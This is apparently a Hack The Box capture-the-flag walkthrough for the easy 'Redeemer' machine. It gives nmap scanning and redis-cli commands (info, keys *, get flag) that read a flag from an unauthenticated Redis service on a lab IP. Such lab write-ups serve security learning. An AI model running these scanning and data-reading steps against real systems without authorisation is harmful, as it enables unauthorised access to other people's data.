## HTB Starting Point: Redeemer  
**Level**: Easy  
**Date**: July 28, 2025  
**Goal**: Exploit an exposed Redis service to retrieve the user flag.

---

### 🧰 Tools  
```bash
- nmap
- redis-cli
- Basic Redis enumeration commands
```

---

### 🧭 Steps  

```bash
# Step 1: Scan all ports using Nmap
nmap -sS -p- -n -T4 10.129.X.X

# Output:
# PORT     STATE SERVICE
# 6379/tcp open  redis
```

```bash
# Step 2: Connect to Redis service
redis-cli -h 10.129.X.X
```

```bash
# Step 3: Check Redis server information
info
```

```bash
# Step 4: Enumerate available keys
keys *

# Output:
# 1) "flag"
```

```bash
# Step 5: Retrieve the flag value
get flag

# Output:
# "HTB{REDACTED}"
```

---

### 💣 Payloads Used  
```bash
nmap -sS -p- -n -T4 10.129.X.X
redis-cli -h 10.129.X.X
info
keys *
get flag
```
